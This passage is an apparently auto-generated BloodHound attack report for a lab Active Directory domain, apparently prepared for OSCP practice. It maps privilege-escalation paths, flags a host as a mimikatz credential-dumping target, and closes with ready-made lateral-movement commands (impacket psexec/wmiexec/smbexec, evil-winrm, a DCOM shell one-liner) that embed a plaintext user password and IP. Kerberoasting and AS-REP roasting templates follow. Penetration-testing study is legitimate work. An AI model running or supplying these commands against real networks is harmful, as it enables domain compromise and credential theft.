| ENTERPRISE ADMINS@SECURA.YZX | KRBTGT@SECURA.YZX | ['User', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@SECURA.YZX | CHARLOTTE@SECURA.YZX | ['User', 'Base'] |
| DOMAIN ADMINS@SECURA.YZX | CHARLOTTE@SECURA.YZX | ['User', 'Base'] |
| ENTERPRISE ADMINS@SECURA.YZX | CHARLOTTE@SECURA.YZX | ['User', 'Base'] |
| DOMAIN ADMINS@SECURA.YZX | DEFAULT DOMAIN CONTROLLERS POLICY@SECURA.YZX | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@SECURA.YZX | DEFAULT DOMAIN CONTROLLERS POLICY@SECURA.YZX | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | DEFAULT DOMAIN POLICY@SECURA.YZX | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@SECURA.YZX | DEFAULT DOMAIN POLICY@SECURA.YZX | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | DOMAIN CONTROLLERS@SECURA.YZX | ['Base', 'OU', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@SECURA.YZX | DOMAIN CONTROLLERS@SECURA.YZX | ['Base', 'OU', 'Tag_Tier_Zero'] |
| CHARLOTTE@SECURA.YZX | DEFAULT DOMAIN POLICY@SECURA.YZX | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@SECURA.YZX | DOMAIN CONTROLLERS@SECURA.YZX | ['Base', 'OU', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@SECURA.YZX | ENTERPRISE ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | DOMAIN ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@SECURA.YZX | ADMINISTRATORS@SECURA.YZX | ['ADLocalGroup', 'Group', 'Base', 'Tag_Tier_Zero'] |

### ✅ WriteOwner Abuse Paths
**OSCP Relevance:** HIGH | **Results:** 63

> Find principals with WriteOwner on targets. Can take ownership, then WriteDacl, then GenericAll.

| Attacker | Victim | VictimType |
| --- | --- | --- |
| CHARLOTTE@SECURA.YZX | DEFAULT DOMAIN POLICY@SECURA.YZX | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@SECURA.YZX | SCHEMA ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@SECURA.YZX | REPLICATOR@SECURA.YZX | ['Group', 'Base'] |
| ENTERPRISE ADMINS@SECURA.YZX | ADMINSDHOLDER@SECURA.YZX | ['Base', 'Container', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@SECURA.YZX | PRINT OPERATORS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@SECURA.YZX | ADMINISTRATOR@SECURA.YZX | ['User', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@SECURA.YZX | DOMAIN ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@SECURA.YZX | READ-ONLY DOMAIN CONTROLLERS@SECURA.YZX | ['Group', 'Base'] |
| ENTERPRISE ADMINS@SECURA.YZX | ACCOUNT OPERATORS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@SECURA.YZX | DEFAULT DOMAIN POLICY@SECURA.YZX | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@SECURA.YZX | KRBTGT@SECURA.YZX | ['User', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@SECURA.YZX | BACKUP OPERATORS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@SECURA.YZX | DOMAIN CONTROLLERS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@SECURA.YZX | CHARLOTTE@SECURA.YZX | ['User', 'Base'] |
| ENTERPRISE ADMINS@SECURA.YZX | DEFAULT DOMAIN CONTROLLERS POLICY@SECURA.YZX | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@SECURA.YZX | SERVER OPERATORS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@SECURA.YZX | ADMINISTRATORS@SECURA.YZX | ['ADLocalGroup', 'Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | SCHEMA ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | DOMAIN CONTROLLERS@SECURA.YZX | ['Base', 'OU', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | DEFAULT DOMAIN CONTROLLERS POLICY@SECURA.YZX | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | READ-ONLY DOMAIN CONTROLLERS@SECURA.YZX | ['Group', 'Base'] |
| DOMAIN ADMINS@SECURA.YZX | ACCOUNT OPERATORS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | PRINT OPERATORS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | CHARLOTTE@SECURA.YZX | ['User', 'Base'] |
| DOMAIN ADMINS@SECURA.YZX | DEFAULT DOMAIN POLICY@SECURA.YZX | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | ENTERPRISE ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | ADMINISTRATOR@SECURA.YZX | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | KRBTGT@SECURA.YZX | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | REPLICATOR@SECURA.YZX | ['Group', 'Base'] |
| DOMAIN ADMINS@SECURA.YZX | BACKUP OPERATORS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | DOMAIN CONTROLLERS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | ADMINISTRATORS@SECURA.YZX | ['ADLocalGroup', 'Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | SERVER OPERATORS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | ADMINSDHOLDER@SECURA.YZX | ['Base', 'Container', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@SECURA.YZX | BACKUP OPERATORS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@SECURA.YZX | DNSADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@SECURA.YZX | CLONEABLE DOMAIN CONTROLLERS@SECURA.YZX | ['Group', 'Base'] |
| ADMINISTRATORS@SECURA.YZX | KEY ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@SECURA.YZX | SCHEMA ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@SECURA.YZX | DOMAIN CONTROLLERS@SECURA.YZX | ['Base', 'OU', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@SECURA.YZX | DOMAIN USERS@SECURA.YZX | ['Group', 'Base'] |
| ADMINISTRATORS@SECURA.YZX | ENTERPRISE ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@SECURA.YZX | SERVER OPERATORS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@SECURA.YZX | REPLICATOR@SECURA.YZX | ['Group', 'Base'] |
| ADMINISTRATORS@SECURA.YZX | ENTERPRISE KEY ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@SECURA.YZX | DOMAIN CONTROLLERS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@SECURA.YZX | DOMAIN COMPUTERS@SECURA.YZX | ['Group', 'Base'] |
| ADMINISTRATORS@SECURA.YZX | ADMINSDHOLDER@SECURA.YZX | ['Base', 'Container', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@SECURA.YZX | ACCOUNT OPERATORS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@SECURA.YZX | PRINT OPERATORS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@SECURA.YZX | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@SECURA.YZX | ['Group', 'Base'] |
| ADMINISTRATORS@SECURA.YZX | KRBTGT@SECURA.YZX | ['User', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@SECURA.YZX | READ-ONLY DOMAIN CONTROLLERS@SECURA.YZX | ['Group', 'Base'] |
| ADMINISTRATORS@SECURA.YZX | HYPER-V ADMINISTRATORS@SECURA.YZX | ['Group', 'Base'] |
| ADMINISTRATORS@SECURA.YZX | ADMINISTRATOR@SECURA.YZX | ['User', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@SECURA.YZX | STORAGE REPLICA ADMINISTRATORS@SECURA.YZX | ['Group', 'Base'] |
| ADMINISTRATORS@SECURA.YZX | DOMAIN ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@SECURA.YZX | DOMAIN GUESTS@SECURA.YZX | ['Group', 'Base'] |
| ADMINISTRATORS@SECURA.YZX | CHARLOTTE@SECURA.YZX | ['User', 'Base'] |
| DOMAIN ADMINS@SECURA.YZX | DOMAIN ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@SECURA.YZX | ENTERPRISE ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@SECURA.YZX | DOMAIN CONTROLLERS@SECURA.YZX | ['Base', 'OU', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@SECURA.YZX | ADMINISTRATORS@SECURA.YZX | ['ADLocalGroup', 'Group', 'Base', 'Tag_Tier_Zero'] |

### ✅ AddKeyCredentialLink (Shadow Credentials)
**OSCP Relevance:** HIGH | **Results:** 14

> Find principals with AddKeyCredentialLink permission. Can add msDS-KeyCredentialLink for certificate-based auth without knowing password.

| Attacker | AttackerType | Target | TargetType |
| --- | --- | --- | --- |
| KEY ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] | ERA.SECURA.YZX | ['Computer', 'Base'] |
| ENTERPRISE KEY ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] | ERA.SECURA.YZX | ['Computer', 'Base'] |
| KEY ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] | DC01.SECURA.YZX | ['Computer', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE KEY ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] | DC01.SECURA.YZX | ['Computer', 'Base', 'Tag_Tier_Zero'] |
| KEY ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] | SECURE.SECURA.YZX | ['Computer', 'Base'] |
| ENTERPRISE KEY ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] | SECURE.SECURA.YZX | ['Computer', 'Base'] |
| KEY ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] | ERIC.WALLOWS@SECURA.YZX | ['User', 'Base'] |
| ENTERPRISE KEY ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] | ERIC.WALLOWS@SECURA.YZX | ['User', 'Base'] |
| KEY ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] | GUEST@SECURA.YZX | ['User', 'Base'] |
| ENTERPRISE KEY ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] | GUEST@SECURA.YZX | ['User', 'Base'] |
| KEY ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] | DEFAULTACCOUNT@SECURA.YZX | ['User', 'Base'] |
| ENTERPRISE KEY ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] | DEFAULTACCOUNT@SECURA.YZX | ['User', 'Base'] |
| KEY ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] | MICHAEL@SECURA.YZX | ['User', 'Base'] |
| ENTERPRISE KEY ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] | MICHAEL@SECURA.YZX | ['User', 'Base'] |

### ⚪ ForceChangePassword Rights
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ AddMember to Privileged Groups
**OSCP Relevance:** HIGH | **Results:** None

### ✅ Owns Relationships on Users/Groups
**OSCP Relevance:** HIGH | **Results:** 27

> Find principals who own other users or groups. Owner can grant themselves full control.

| Owner | OwnedObject | ObjectType |
| --- | --- | --- |
| DOMAIN ADMINS@SECURA.YZX | KEY ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | CHARLOTTE@SECURA.YZX | ['User', 'Base'] |
| DOMAIN ADMINS@SECURA.YZX | DOMAIN GUESTS@SECURA.YZX | ['Group', 'Base'] |
| DOMAIN ADMINS@SECURA.YZX | REPLICATOR@SECURA.YZX | ['Group', 'Base'] |
| DOMAIN ADMINS@SECURA.YZX | ADMINISTRATORS@SECURA.YZX | ['ADLocalGroup', 'Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | DEFAULT DOMAIN POLICY@SECURA.YZX | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | ADMINISTRATOR@SECURA.YZX | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | ADMINSDHOLDER@SECURA.YZX | ['Base', 'Container', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | DOMAIN CONTROLLERS@SECURA.YZX | ['Base', 'OU', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | DOMAIN COMPUTERS@SECURA.YZX | ['Group', 'Base'] |
| DOMAIN ADMINS@SECURA.YZX | DOMAIN USERS@SECURA.YZX | ['Group', 'Base'] |
| DOMAIN ADMINS@SECURA.YZX | DOMAIN CONTROLLERS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | READ-ONLY DOMAIN CONTROLLERS@SECURA.YZX | ['Group', 'Base'] |
| DOMAIN ADMINS@SECURA.YZX | ACCOUNT OPERATORS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | CLONEABLE DOMAIN CONTROLLERS@SECURA.YZX | ['Group', 'Base'] |
| DOMAIN ADMINS@SECURA.YZX | DEFAULT DOMAIN CONTROLLERS POLICY@SECURA.YZX | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | BACKUP OPERATORS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | SCHEMA ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@SECURA.YZX | ['Group', 'Base'] |
| DOMAIN ADMINS@SECURA.YZX | PRINT OPERATORS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | ENTERPRISE ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | KRBTGT@SECURA.YZX | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | ENTERPRISE KEY ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@SECURA.YZX | SERVER OPERATORS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@SECURA.YZX | HYPER-V ADMINISTRATORS@SECURA.YZX | ['Group', 'Base'] |
| ADMINISTRATORS@SECURA.YZX | STORAGE REPLICA ADMINISTRATORS@SECURA.YZX | ['Group', 'Base'] |
| DOMAIN ADMINS@SECURA.YZX | DOMAIN ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] |

### ⚪ GPO Abuse Paths
**OSCP Relevance:** MEDIUM | **Results:** None

### ⚪ OU Control for Object Manipulation
**OSCP Relevance:** MEDIUM | **Results:** None

### ⚪ AllExtendedRights Enumeration
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ Read LAPS Password Rights
**OSCP Relevance:** HIGH | **Results:** None

### ✅ All Domain Admins
**OSCP Relevance:** HIGH | **Results:** 1

> List all members of Domain Admins group (including nested membership). Know your targets.

| DomainAdmin | Enabled | AdminCount |
| --- | --- | --- |
| ADMINISTRATOR@SECURA.YZX | True | True |

### ⚪ GenericWrite on Users
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ WriteSPN for Targeted Kerberoasting
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ WriteAccountRestrictions for RBCD
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ SyncLAPSPassword Rights
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ AddAllowedToAct Rights
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ DCSync (Composite Check)
**OSCP Relevance:** HIGH | **Results:** None

---

## Attack Chains

### ✅ Full Attack Path: Owned User -> Pivot -> DA
**OSCP Relevance:** HIGH | **Results:** 1

> Find complete attack paths from low-privilege owned user through pivot systems to Domain Admin. Reconstructs DCSync capstone-style attack chains.

| OwnedUser | PivotMachine | PivotMachineIP | Note |
| --- | --- | --- | --- |
| ERIC.WALLOWS@SECURA.YZX | SECURE.SECURA.YZX | 192.168.179.95 | DA has admin here - MIMIKATZ TARGET |

### ✅ Shortest Path to Domain Admins
**OSCP Relevance:** HIGH | **Results:** 2

> Find shortest privilege escalation path from any enabled user to Domain Admins group.

| StartUser | Hops | Path |
| --- | --- | --- |
| ERIC.WALLOWS@SECURA.YZX | 3 | ['ERIC.WALLOWS@SECURA.YZX', 'DOMAIN USERS@SECURA.YZX', 'USERS@SECURA.YZX', 'DOMAIN ADMINS@SECURA.YZX'] |
| MICHAEL@SECURA.YZX | 3 | ['MICHAEL@SECURA.YZX', 'DOMAIN USERS@SECURA.YZX', 'USERS@SECURA.YZX', 'DOMAIN ADMINS@SECURA.YZX'] |

### ⚪ All Paths to Domain Admin (Multi-Hop)
**OSCP Relevance:** HIGH | **Results:** None

### ✅ Credential Harvest Opportunities
**OSCP Relevance:** HIGH | **Results:** 1

> Find machines where you have admin AND Domain Admin has access. Prime targets for mimikatz credential dumping.

| OwnedUser | TargetMachine | TargetMachineIP | Action |
| --- | --- | --- | --- |
| ERIC.WALLOWS@SECURA.YZX | SECURE.SECURA.YZX | 192.168.179.95 | Run mimikatz - DA creds may be cached |

### Find Paths Through Specific Computer
*Skipped - requires variables: COMPUTER*

### Shortest Path Between Two Users
*Skipped - requires variables: SOURCE_USER, TARGET_USER*

### ⚪ Path to High-Value Targets
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ Circular Group Memberships
**OSCP Relevance:** LOW | **Results:** None

---

## Owned Principal

### What Can Owned User Access?
*Skipped - requires variables: USER*

### Quick Wins from Owned User Context
*Skipped - requires variables: USER*

### Path to DA from Owned User
*Skipped - requires variables: USER*

### Owned User Group Memberships
*Skipped - requires variables: USER*

### Outbound Object Control from Owned
*Skipped - requires variables: USER*

### First Hop Lateral Movement
*Skipped - requires variables: USER*

### Kerberoastable from Owned Context
*Skipped - requires variables: USER*

### ⚪ AS-REP Targets from Owned Context
**OSCP Relevance:** HIGH | **Results:** None

### Session Harvest Opportunities
*Skipped - requires variables: USER*

### Chained Privilege Escalation
*Skipped - requires variables: USER*

---

## Operational

### ✅ Computers by Operating System (Find Legacy)
**OSCP Relevance:** MEDIUM | **Results:** 2

> Enumerate computers grouped by OS. Legacy systems (2008, 2003, XP) are often more vulnerable.

| OS | Computers | Count |
| --- | --- | --- |
| WINDOWS 10 PRO | ['ERA.SECURA.YZX', 'SECURE.SECURA.YZX'] | 2 |
| WINDOWS SERVER 2016 STANDARD | ['DC01.SECURA.YZX'] | 1 |

### ⚪ Legacy Windows Systems
**OSCP Relevance:** HIGH | **Results:** None

### ✅ Password Age Distribution
**OSCP Relevance:** MEDIUM | **Results:** 4

> Find users with old passwords. Old passwords may be weak or appear in breach databases.

| User | PasswordLastSet | IsPrivileged | Description |
| --- | --- | --- | --- |
| ADMINISTRATOR@SECURA.YZX | 3 years ago | True | Built-in account for administering the computer/domain |
| MICHAEL@SECURA.YZX | 3 years ago | False |  |
| CHARLOTTE@SECURA.YZX | 3 years ago | True |  |
| ERIC.WALLOWS@SECURA.YZX | 11 months ago | False |  |

### ✅ Inactive User Accounts
**OSCP Relevance:** MEDIUM | **Results:** 1

> Find enabled users who haven't logged in recently. May have default or forgotten passwords.

| User | LastLogon | Description |
| --- | --- | --- |
| ADMINISTRATOR@SECURA.YZX | 1 day ago | Built-in account for administering the computer/domain |

### ✅ Enabled vs Disabled Account Ratio
**OSCP Relevance:** LOW | **Results:** 3

> Count enabled vs disabled accounts. High disabled count may indicate account churn.

| Enabled | Count |
| --- | --- |
|  | 2 |
| True | 4 |
| False | 3 |

### ⚪ Domain Trust Relationships
**OSCP Relevance:** MEDIUM | **Results:** None

### ✅ Relationship Count by Type
**OSCP Relevance:** LOW | **Results:** 44

> Count all relationship types in the database. Helps understand AD structure and attack surface.

| Relationship | Count |
| --- | --- |
| HAS_INDICATOR | 22466 |
| TAGGED | 17084 |
| HAS_FLAG | 6998 |
| NEXT_STEP | 2405 |
| ALTERNATIVE | 2341 |
| REFERENCES_COMMAND | 1156 |
| PREREQUISITE | 1140 |
| WriteDacl | 1003 |
| WriteOwner | 1003 |
| WriteOwnerRaw | 996 |
| GenericAll | 720 |
| Owns | 545 |
| OwnsRaw | 540 |
| Contains | 538 |
| HAS_STEP | 416 |
| EXECUTES | 358 |
| GenericWrite | 195 |
| DEMONSTRATES | 106 |
| MemberOf | 86 |
| TEACHES_SKILL | 30 |
| AllExtendedRights | 30 |
| MemberOfLocalGroup | 30 |
| AddKeyCredentialLink | 28 |
| ProtectAdminGroups | 28 |
| LocalToComputer | 22 |
| EXTRACTED_FROM | 20 |
| REQUIRES_SKILL | 18 |
| ClaimSpecialIdentity | 16 |
| GetChanges | 6 |
| GetChangesAll | 6 |
| WriteAccountRestrictions | 6 |
| AdminTo | 6 |
| FROM_PLATFORM | 4 |
| GetChangesInFilteredSet | 4 |
| GPLink | 4 |
| DCSync | 4 |
| BELONGS_TO | 4 |
| CanPSRemote | 4 |
| RemoteInteractiveLogonRight | 4 |
| EXPLOITS_CVE | 2 |
| TEACHES_TECHNIQUE | 2 |
| CoerceToTGT | 2 |
| DCFor | 2 |
| CanRDP | 2 |

### ✅ High-Value Target Summary
**OSCP Relevance:** HIGH | **Results:** 9

> List all objects marked as high-value in BloodHound. Primary targets for attack planning.

| Target | Type | Description |
| --- | --- | --- |
| ADMINISTRATORS@SECURA.YZX | ['ADLocalGroup', 'Group', 'Base', 'Tag_Tier_Zero'] | Administrators have complete and unrestricted access to the computer/domain |
| SECURA.YZX | ['Base', 'Domain', 'Tag_Tier_Zero'] |  |
| ACCOUNT OPERATORS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] | Members can administer domain user and group accounts |
| BACKUP OPERATORS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] | Backup Operators can override security restrictions for the sole purpose of backing up or restoring files |
| DOMAIN ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] | Designated administrators of the domain |
| DOMAIN CONTROLLERS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] | All domain controllers in the domain |
| ENTERPRISE ADMINS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] | Designated administrators of the enterprise |
| PRINT OPERATORS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] | Members can administer printers installed on domain controllers |
| SERVER OPERATORS@SECURA.YZX | ['Group', 'Base', 'Tag_Tier_Zero'] | Members can administer domain servers |

---

## Summary

| Metric | Count |
| ------ | ----- |
| Total Queries | 74 |
| With Results | 26 |
| No Results | 34 |
| Skipped | 14 |
| Failed | 0 |

### Key Findings

- **WriteDacl Abuse Paths**: 63 results (Privilege Escalation)
- **WriteOwner Abuse Paths**: 63 results (Privilege Escalation)
- **GenericAll on High-Value Targets**: 32 results (Privilege Escalation)
- **Owns Relationships on Users/Groups**: 27 results (Privilege Escalation)
- **AddKeyCredentialLink (Shadow Credentials)**: 14 results (Privilege Escalation)
- **High-Value Target Summary**: 9 results (Operational)
- **DCSync Rights**: 6 results (Privilege Escalation)
- **PSRemote Access (Evil-WinRM Targets)**: 2 results (Lateral Movement)
- **Shortest Path to Domain Admins**: 2 results (Attack Chains)
- **Unconstrained Delegation Systems**: 1 results (Quick Wins)
- **Non-DA Users with Local Admin on Workstations**: 1 results (Lateral Movement)
- **All Local Admins per Computer**: 1 results (Lateral Movement)
- **RDP Access Targets**: 1 results (Lateral Movement)
- **Coercion Targets (Unconstrained Delegation)**: 1 results (Lateral Movement)
- **All Domain Admins**: 1 results (Privilege Escalation)
- **Full Attack Path: Owned User -> Pivot -> DA**: 1 results (Attack Chains)
- **Credential Harvest Opportunities**: 1 results (Attack Chains)


## 🎯 Pwned User Attack Paths

### ERIC.WALLOWS@SECURA.YZX
**Credential:** password

#### Local Admin Access (1 machines)

**SECURE.SECURA.YZX**

| Technique | Command |
|-----------|---------|
| psexec | `impacket-psexec 'secura.yzx/ERIC.WALLOWS:EricLikesRunning800'@192.168.179.95` |
| wmiexec | `impacket-wmiexec 'secura.yzx/ERIC.WALLOWS:EricLikesRunning800'@192.168.179.95` |
| smbexec | `impacket-smbexec 'secura.yzx/ERIC.WALLOWS:EricLikesRunning800'@192.168.179.95` |
| dcomexec | `impacket-dcomexec -object MMC20 'secura.yzx/ERIC.WALLOWS:EricLikesRunning800'@192.168.179.95` |
| evil-winrm | `evil-winrm -i 192.168.179.95 -u ERIC.WALLOWS -p 'EricLikesRunning800'` |
| dcom | `$dcom=[System.Activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application.1','192.168.179.95')); $dcom.Document.ActiveView.ExecuteShellCommand('cmd',$null,'/c <COMMAND>','7')` |


**Technique Comparison**

| Technique | Noise | Ports | Advantages | Disadvantages |
|-----------|-------|-------|------------|---------------|
| psexec | HIGH | 445 | Reliable, gets SYSTEM shell, works with hash/ticket | Creates service, logged in Event Log, AV detection |
| wmiexec | MEDIUM | 135 | No service creation, runs as user, uses WMI (legitimate) | No SYSTEM shell, requires RPC, slower than PsExec |
| smbexec | HIGH | 445 | SYSTEM shell, creates fewer artifacts than PsExec | Service creation, Event Log entries, AV detection |
| dcomexec | MEDIUM | 135 | Uses DCOM (often overlooked), runs as user | Requires RPC, less reliable than PsExec/WMI |
| evil-winrm | LOW | 5985,5986 | Interactive PowerShell, file upload/download, stealthy, great for post-exploitation | Requires WinRM enabled, may need firewall exception |
| dcom | LOW | 135 | Fileless, native PowerShell, no tools needed, often bypasses detection | Requires compromised Windows host to run from, no interactive shell |

#### Authenticated User Attacks (Any Domain User)

Replace placeholders with your credentials:

| Attack | Command Template |
|--------|------------------|
| AS-REP Roasting ⚡ | `impacket-GetNPUsers '<DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip <DC_IP> -request` |
| Kerberoasting ⚡ | `impacket-GetUserSPNs '<DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip <DC_IP> -request` |
| BloodHound Collection ⚡ | `bloodhound-python -c all -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN> -dc <DC_IP>` |
| Domain User Enumeration | `crackmapexec smb <DC_IP> -u <USERNAME> -p '<PASSWORD>' --users` |
| Domain Admins Members | `crackmapexec ldap <DC_IP> -u <USERNAME> -p '<PASSWORD>' -M groupmembership -o GROUP='Domain Admins'` |
| Share Enumeration | `crackmapexec smb <DC_IP> -u <USERNAME> -p '<PASSWORD>' --shares` |
| Computer Enumeration | `crackmapexec smb <DC_IP> -u <USERNAME> -p '<PASSWORD>' --computers` |
| Password Policy | `crackmapexec smb <DC_IP> -u <USERNAME> -p '<PASSWORD>' --pass-pol` |
| Domain Trust Enumeration | `crackmapexec ldap <DC_IP> -u <USERNAME> -p '<PASSWORD>' -M enum_trusts` |
| GPO Enumeration | `crackmapexec ldap <DC_IP> -u <USERNAME> -p '<PASSWORD>' -M enum_gpo` |


## 🔓 Post-Exploitation Commands

